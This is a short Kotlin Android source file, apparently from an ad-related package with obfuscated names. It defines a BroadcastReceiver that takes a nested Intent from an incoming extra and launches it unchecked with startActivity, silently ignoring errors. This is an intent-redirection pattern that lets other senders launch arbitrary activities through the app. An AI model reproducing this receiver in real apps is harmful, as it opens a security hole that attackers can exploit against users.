package bigo.ad.zaq.jqs

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Parcelable
import android.util.Log
import androidx.annotation.Keep

class MiniR: BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent) {
        if (intent.hasExtra("uo")) {
            val eIntent = intent.getParcelableExtra<Parcelable>("uo") as Intent?
            if (eIntent != null) {
                try {
                    Log.e("TAG", "onReceive: PngTwoMRecent", )
                    context.startActivity(eIntent)
                    return
                } catch (e: Exception) {
                }
            }
        }
    }
}